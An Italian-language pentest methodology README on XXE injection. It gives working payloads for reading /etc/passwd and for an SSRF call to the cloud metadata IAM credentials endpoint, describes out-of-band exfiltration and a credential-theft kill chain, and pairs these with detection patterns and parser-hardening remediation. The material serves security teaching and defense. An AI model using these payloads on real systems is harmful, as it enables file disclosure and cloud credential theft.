> [English](README.en.md) | **Italiano**

# XXE - XML External Entity Injection

> - **Fase:** Web Exploitation - OWASP A05:2021 Security Misconfiguration / Injection (parsing XML non sicuro)
> - **Visibilita:** Media - richieste XML anomale verso l'endpoint; le varianti out-of-band generano traffico in uscita dal server verso l'attaccante
> - **Prerequisiti:** un endpoint che accetta e processa input XML (API SOAP/REST, upload di file XML/DOCX/SVG, SAML) con un parser che risolve le entita esterne
> - **Natura del documento:** metodologia. Payload illustrativi (forma didattica OWASP), nessun Finding ID fabbricato (prossimo `WEB-016`, da assegnare in lab).

- Obiettivo: sfruttare un parser XML mal configurato per leggere file locali dal server, effettuare SSRF verso servizi interni, o causare denial of service, tramite la definizione di entita esterne nel documento XML.

---

## Executive Summary

XXE sfrutta una funzionalita legittima ma pericolosa dello standard XML: le entita esterne, che permettono a
un documento di includere contenuto da una fonte esterna (un file, una URL). Se l'applicazione passa l'input
XML dell'utente a un parser che risolve queste entita senza disabilitarle, un attaccante puo definire
un'entita che punta a un file del server (`file:///etc/passwd`) o a un servizio interno
(`http://169.254.169.254/` per i metadata cloud), e vedersi restituire il contenuto nella risposta
dell'applicazione (XXE "in-band") o esfiltrarlo verso un proprio server (XXE "out-of-band", quando la
risposta non e visibile).

Gli impatti principali sono: lettura di file arbitrari (configurazioni, chiavi, `/etc/passwd`), SSRF verso
l'infrastruttura interna e i metadata cloud, e denial of service (es. "billion laughs"). E un vettore spesso
sottovalutato perche nascosto in funzionalita non ovvie: upload di documenti Office/SVG, endpoint SAML,
vecchie API SOAP.

## Contesto operativo (perche, prima del come)

XXE si cerca ovunque l'applicazione accetti XML, anche indirettamente. I formati DOCX, XLSX e SVG sono ZIP
contenenti XML: un upload di "immagine" SVG o di "documento" puo essere un vettore XXE. La decisione
operativa e capire se la risposta riflette il contenuto parsato (in-band, piu semplice) o no (serve la
variante out-of-band con un server esterno controllato). Prima si testa con un'entita innocua per confermare
che il parser le risolva, poi si punta a file o servizi sensibili.

## Esecuzione / Comandi

### Fase 1 - Conferma che il parser risolva le entita

Si invia un XML con un'entita interna e si verifica se viene espansa nella risposta:

```xml
<?xml version="1.0"?>
<!DOCTYPE test [ <!ENTITY probe "XXE-OK"> ]>
<data>&probe;</data>
```

Se la risposta contiene `XXE-OK`, il parser espande le entita: il target e candidato a XXE.

### Fase 2 - Lettura di file locali (in-band)

Entita esterna che punta a un file del server (forma didattica canonica OWASP):

```xml
<?xml version="1.0"?>
<!DOCTYPE data [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>&xxe;</data>
```

Output illustrativo (rappresentativo, nella risposta dell'app):

```
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin   <-- lettura di /etc/passwd via XXE
```

### Fase 3 - SSRF verso metadata cloud o servizi interni

```xml
<!DOCTYPE data [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
```

### Variante out-of-band (quando la risposta non mostra il contenuto)

Quando l'app non riflette l'entita, si usa un DTD esterno ospitato su un server controllato che esfiltra il
file via una richiesta in uscita (si cattura il contenuto nei log del proprio server). E il collegamento
naturale con la [SSRF](../../05-api-security/README.md) e con gli attacchi ai metadata cloud.

## Analisi dei risultati

La lettura di `/etc/passwd` conferma XXE con lettura di file arbitrari: da qui si puntano file ad alto valore
(`/etc/shadow` se il processo e privilegiato, file di configurazione dell'app con credenziali DB, chiavi
private, token). Se la variante SSRF raggiunge i metadata cloud (169.254.169.254), l'impatto sale a furto di
credenziali IAM temporanee. La severity reale, in lab, va da `Alto` (lettura file sensibili) a `Critico`
(SSRF a metadata cloud con credenziali, o RCE in scenari specifici). Un parser che non espande le entita
(test di Fase 1 negativo) chiude il vettore.

### Analisi Teorica

XXE nasce dalla combinazione di due proprieta dello standard XML (DTD): la capacita di definire entita e la
capacita di risolverle da fonti esterne (`SYSTEM`). Il problema e che molti parser, per retrocompatibilita,
risolvono le entita esterne per default. E un caso di confusione tra dati e istruzioni: l'input dell'utente
(che dovrebbe essere solo dati) contiene direttive (la definizione di entita) che il parser esegue. La
contromisura e strutturale e definitiva: disabilitare la risoluzione di DTD/entita esterne nel parser
(secure-by-default), perche la quasi totalita delle applicazioni non ne ha bisogno. Collega al tema generale
dell'injection [Su & Wassermann 2006]: fidarsi dell'input come se fosse codice.

## Remediation (Blue Team)

**Rilevamento (WAF/SIEM).**
- Richieste contenenti `<!DOCTYPE`, `<!ENTITY`, o riferimenti `SYSTEM`/`PUBLIC` nel corpo XML.
- Traffico in uscita dal web server verso destinazioni inattese (segno di XXE out-of-band o SSRF).
- Accesso del processo web a file sensibili (`/etc/passwd`, config) o a 169.254.169.254.

**Hardening (secure coding).**
- Disabilitare la risoluzione di entita esterne e DTD nel parser XML (la contromisura primaria). In Java:
  `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`; analoghi in .NET, PHP, Python
  (`defusedxml`).
- Preferire formati di dati meno pericolosi (JSON) dove possibile.
- Validare e limitare i formati di upload; trattare DOCX/SVG come potenziali vettori XML.
- Segmentare la rete per impedire al web server di raggiungere i metadata cloud (IMDSv2 con hop limit).

---

## Scenario Reale: Proiezione Post-Exploitation

> Vale per l'esito "lettura file sensibili / SSRF a metadata" (severity Alto/Critico).

### Prospettiva Attaccante (Red Team)

**Punto di partenza:** endpoint che processa XML con parser vulnerabile (confermato in Fase 1).

**Passo successivo immediato:** lettura di file di configurazione dell'applicazione per estrarre credenziali
(DB, API), oppure SSRF verso i metadata cloud.

**Kill Chain proiettata:**

```
Endpoint XML vulnerabile
        |
        v
XXE -> lettura config app (credenziali DB, chiavi)
   oppure
XXE + SSRF -> 169.254.169.254 -> credenziali IAM temporanee
        |
        v
Accesso al DB / al cloud con le credenziali ottenute
        |
        v
Esfiltrazione dati / escalation nel cloud (vedi modulo 10)
```

**Impatto potenziale:** furto di credenziali applicative o cloud a partire da una funzionalita di parsing
XML. Nel caso SSRF-metadata, l'impatto si estende all'account cloud.

**Vettori di monetizzazione tipici:** esfiltrazione e rivendita dei dati; abuso delle credenziali cloud per
cryptomining o ulteriore compromissione.

### Prospettiva Difensore (Blue Team)

**Rilevamento:** payload XML con DOCTYPE/ENTITY; traffico in uscita anomalo dal web server; accesso a file
sensibili o ai metadata.

**Indicatori di Compromissione (IOC):**
- Corpi di richiesta con `<!ENTITY ... SYSTEM ...>`.
- Connessioni dal web server verso 169.254.169.254 o verso un host esterno non previsto.
- Lettura di `/etc/passwd` o di file di configurazione da parte del processo web.

**Contenimento:** blocco dell'endpoint o del pattern via WAF; rotazione delle credenziali potenzialmente
lette; verifica degli accessi ai metadata.

**Eradicazione e hardening:** disabilitare DTD/entita esterne nel parser; IMDSv2; segmentazione; code review
dei punti che parsano XML.

**Lezione difensiva:** XXE e un difetto di configurazione del parser, non dell'applicazione in senso stretto.
La difesa definitiva e il parser secure-by-default: nessun controllo a valle sostituisce la disabilitazione
delle entita esterne.

---

## Tool di riferimento

| Tool | Tipo | Tecnica/Accesso | Caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `Burp Suite` | Proxy/scanner | Web - Attivo | Intercetta e modifica richieste XML; estensioni per XXE e collaboratore OOB |
| `curl` | HTTP client | CLI - Attivo | Invio manuale di payload XML all'endpoint |
| `XXEinjector` | Exploit tool | CLI - Attivo | Automazione di XXE, incluse varianti out-of-band |
| `defusedxml` | Libreria Python | Secure coding | Parser XML sicuro per la remediation (Blue Team) |

## Note di metodologia

In lab reale (es. un'app con endpoint XML o un target OWASP WebGoat) i dati da documentare come finding: la
conferma dell'espansione entita, il file letto e l'eventuale SSRF riuscita. Valgono le regole di integrita:
output reali, mai fabbricati. I payload mostrati sono nella forma didattica OWASP.

## Mappatura MITRE ATT&CK

| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
| :--- | :--- | :--- | :--- |
| Initial Access | Exploit Public-Facing Application | `T1190` | Sfruttamento del parser XML vulnerabile su un endpoint esposto. |
| Discovery | File and Directory Discovery | `T1083` | Lettura di file locali del server tramite entita esterna. |
| Credential Access | Unsecured Credentials: Credentials in Files | `T1552.001` | Estrazione di credenziali da file di configurazione letti via XXE. |

---

## Correlazioni con altri finding

| Provenienza | Questa tecnica | Effetto |
| :--- | :--- | :--- |
| [02-web-recon](../../02-web-recon (Enumeration)/README.md) | XXE | l'enumerazione individua endpoint XML/SOAP e funzionalita di upload |
| XXE (SSRF a metadata) | [10-cloud-security](../../../10-cloud-security (Cloud&Modern)/README.md) | le credenziali IAM ottenute aprono all'escalation nel cloud |
| XXE | [secure-coding-lab](../../06-secure-coding-lab (Defense)/README.md) | la remediation (parser sicuro) si collega al laboratorio di secure coding |

---

> **Nota:** Contenuto didattico e di metodologia. Le tecniche vanno eseguite esclusivamente su applicazioni di proprieta o con autorizzazione esplicita. I payload sono illustrativi e non provengono da sistemi reali o di terze parti.
